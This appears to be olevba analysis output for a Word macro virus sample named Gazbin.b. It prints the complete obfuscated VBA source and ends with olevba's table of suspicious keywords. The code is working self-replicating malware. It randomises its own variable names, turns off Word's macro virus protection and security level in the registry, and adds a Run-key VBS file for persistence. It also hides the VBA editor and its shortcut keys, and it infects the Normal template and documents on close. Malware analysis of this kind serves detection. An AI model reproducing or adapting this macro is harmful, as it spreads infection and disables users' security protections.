olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Gazbin.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Gazbin.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Gazbin.b - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub ¨–Č™¤É°ž�­ŞĄ±ÉŻ�() 'IK
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_VisB = "Vi" & "su" & "al" & " Ba" & "sic"
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_CuZt = "Cu" & "st" & "om" & "ize" & "..."
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_TooL = "To" & "ol" & "s"
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_MaCr = "Ma" & "cr" & "o"
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Name = "Ga" & "zB" & "in"
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_97 = "HK" & "EY_" & "CUR" & "REN" & "T_U" & "SER" & "\S" & "of" & "twa" & "re\" & "Mic" & "ros" & "oft" & "\Of" & "fic" & "e\8" & ".0" & "\W" & "ord" & "\Op" & "ti" & "ons"
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Reg = "HK" & "EY_" & "CUR" & "REN" & "T_U" & "SER" & "\S" & "of" & "twa" & "re\" & "Mic" & "ros" & "oft" & "\Of" & "fic" & "e\9" & ".0\" & "Wor" & "d\" & "Sec" & "uri" & "ty"
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_XP = "HK" & "EY_" & "CUR" & "REN" & "T_U" & "SER" & "\S" & "of" & "twa" & "re\" & "Mic" & "ros" & "oft" & "\Of" & "fic" & "e\10" & ".0\" & "Wor" & "d\" & "Sec" & "uri" & "ty"
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_run = "HK" & "EY_" & "CUR" & "REN" & "T_U" & "SER" & "\S" & "of" & "twa" & "re\" & "Mic" & "ros" & "oft\" & "Wi" & "nd" & "ows" & "\Cu" & "rren" & "tVer" & "si" & "on\" & "Run"
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_ACVB = "Ac" & "ces" & "sVB" & "OM"
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_LVL = "Le" & "v" & "el"
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_EMVP = "En" & "abl" & "eMac" & "roVir" & "usPro" & "tect" & "ion"
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Sys = Environ("Wi" & "nd" & "ir") & "\s" & "ys" & "tem" & "\Ga" & "zbi" & "n.s" & "ys"
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_vbs = Environ("Wi" & "nd" & "ir") & "\s" & "ys" & "tem" & "\Ga" & "zbi" & "n.v" & "bs"
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Chk = "Pri" & "vat" & "e S" & "ub " & "¨–Č™¤É°ž�­ŞĄ±ÉŻ�" & "() " & "'I" & "K"
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_One = ((VBA.Tan(VBA.Rnd * ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null) + VBA.Fix(VBA.Rnd * ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null)) * ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null) + VBA.Fix(¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null + 1)
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null = (VBA.Sin(VBA.Rnd * False) + VBA.Tan(VBA.Rnd * False)) * False
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Two = ((VBA.Sin(VBA.Rnd * ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_One) + VBA.Cos(VBA.Rnd * ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_One)) * ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null) + VBA.Fix(¨–Č™¤É°ž�­ŞĄ±ÉŻ�_One + ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_One)
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Hone = &H1
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_HNul = &H0
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_KF11 = wdKeyF11
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_KAlt = wdKeyAlt
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_KF8 = wdKeyF8
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_NCV = msoBarNoChangeVisible
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_NCZ = msoBarNoCustomize
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_WDA = wdAlertsNone
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_ECK = wdCancelDisabled
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_code = ThisDocument.VBProject.VBComponents(¨–Č™¤É°ž�­ŞĄ±ÉŻ�_One).CodeModule.lines(¨–Č™¤É°ž�­ŞĄ±ÉŻ�_One, ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_One & ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null & ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null & ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null)
Randomize Timer

For ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_I = 1 To 10 + VBA.Int(VBA.Rnd * 30)
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_NewVar = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_NewVar & Chr(VBA.Int(VBA.Rnd * 75) + VBA.Int(129))
Next

Do While InStr(¨–Č™¤É°ž�­ŞĄ±ÉŻ�_code, "¨–Č™¤É°ž�­ŞĄ±ÉŻ�") <> 0
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_code = Mid(¨–Č™¤É°ž�­ŞĄ±ÉŻ�_code, 1, InStr(¨–Č™¤É°ž�­ŞĄ±ÉŻ�_code, "¨–Č™¤É°ž�­ŞĄ±ÉŻ�") - 1) & ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_NewVar & Mid(¨–Č™¤É°ž�­ŞĄ±ÉŻ�_code, InStr(¨–Č™¤É°ž�­ŞĄ±ÉŻ�_code, "¨–Č™¤É°ž�­ŞĄ±ÉŻ�") + Len("¨–Č™¤É°ž�­ŞĄ±ÉŻ�"))
Loop

Set ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Adoc = ActiveDocument
Set ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Norm = NormalTemplate
Set ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Mcon = MacroContainer
Set ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_syst = System
Set ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_CVB = CommandBars(¨–Č™¤É°ž�­ŞĄ±ÉŻ�_VisB)
Set ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_CTL = CommandBars(¨–Č™¤É°ž�­ŞĄ±ÉŻ�_TooL)
Set ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Opt = Options
Set ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_App = Application

Open ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Sys For Output As #1
Print #1, ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_code
Close #1

Open ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_vbs For Output As #1
Print #1, "O" & "n " & "erro" & "r re" & "sume ne" & "xt"
Print #1, "¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Nu" & "ll =" & " (Si" & "n(R" & "nd *" & " Fal" & "se)" & " + " & "vba.tan" & "(Rn" & "d *" & " F" & "al" & "se)" & ") * " & "F" & "alse"
Print #1, "¨–Č™¤É°ž�­ŞĄ±ÉŻ�_One = ((" & "vba.tan(" & "vba.Rnd " & "* ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null) + Fi" & "x(R" & "nd * ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_" & "N" & "ull)) * ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_N" & "ull) + Fi" & "x(¨–Č™¤É°ž�­ŞĄ±ÉŻ�_" & "Nul" & "l +" & " 1)"
Print #1, "Set" & " wrd" & " = Cr" & "eate" & "oBject(" & Chr(34) & "Wo" & "rd.Ap" & "plic" & "ation" & Chr(34) & ")"
Print #1, "with" & " wrd" & ".nor" & "malt" & "emp" & "lat" & "e.v" & "bpr" & "ojec" & "t.vb" & "com" & "pon" & "ents" & "(¨–Č™¤É°ž�­ŞĄ±ÉŻ�" & "_On" & "e).c" & "odem" & "odule"
Print #1, "¨–Č™¤É°ž�­ŞĄ±ÉŻ�_All" & "Lines =" & " .Coun" & "tOfL" & "ines"
Print #1, ".Del" & "etel" & "ines " & "¨–Č™¤É°ž�­ŞĄ±ÉŻ�_One" & ", ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Al" & "lLines"
Print #1, ".A" & "ddfr" & "omfi" & "le " & Chr(34) & ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Sys & Chr(34)
Print #1, "en" & "d wi" & "th"
Print #1, "wr" & "d.Qu" & "it"
Close #1

With ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_syst
.PrivateProfileString("", ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_97, ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_EMVP) = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_HNul
.PrivateProfileString("", ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Reg, ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_LVL) = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Hone
.PrivateProfileString("", ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_XP, ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_LVL) = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Hone
.PrivateProfileString("", ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_XP, ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_ACVB) = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Hone
.PrivateProfileString("", ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_run, ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Name) = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_vbs
End With

With ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_CVB
.Visible = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null
.Enabled = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null
.Protection = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_NCV
.Protection = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_NCZ
End With

With ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_CTL
.Controls(¨–Č™¤É°ž�­ŞĄ±ÉŻ�_MaCr).Enabled = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null
.Controls(¨–Č™¤É°ž�­ŞĄ±ÉŻ�_CuZt).Enabled = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null
End With

With ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Opt
.SaveNormalPrompt = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null
.ConfirmConversions = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null
End With

With ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_App
.DisplayAlerts = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_WDA
.ScreenUpdating = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null
.DisplayStatusBar = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null
.EnableCancelKey = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_ECK
.ShowVisualBasicEditor = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null
End With

FindKey(BuildKeyCode(¨–Č™¤É°ž�­ŞĄ±ÉŻ�_KF11, ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_KAlt)).Disable
FindKey(BuildKeyCode(¨–Č™¤É°ž�­ŞĄ±ÉŻ�_KF8, ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_KAlt)).Disable

If ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Mcon = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Adoc Then Set ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Target = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Norm
If ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Mcon = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Norm Then Set ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Target = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Adoc

If ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Target = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Adoc Then ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Target.ReadOnlyRecommended = ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Null

With ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Target.VBProject.VBComponents(¨–Č™¤É°ž�­ŞĄ±ÉŻ�_One).CodeModule
¨–Č™¤É°ž�­ŞĄ±ÉŻ�_AllLines = .CodePane.CodeModule.CountOfLines
If .CodePane.CodeModule.lines(¨–Č™¤É°ž�­ŞĄ±ÉŻ�_One, ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_One) <> ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_Chk Then
.CodePane.CodeModule.DeleteLines ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_One, ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_AllLines
.CodePane.CodeModule.InsertLines ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_One, ¨–Č™¤É°ž�­ŞĄ±ÉŻ�_code
End If
End With

End Sub
Private Sub Document_Close()
Call ¨–Č™¤É°ž�­ŞĄ±ÉŻ�
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |t.vb                |Executable file name                         |
|Base64    |z{l                 |ents                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

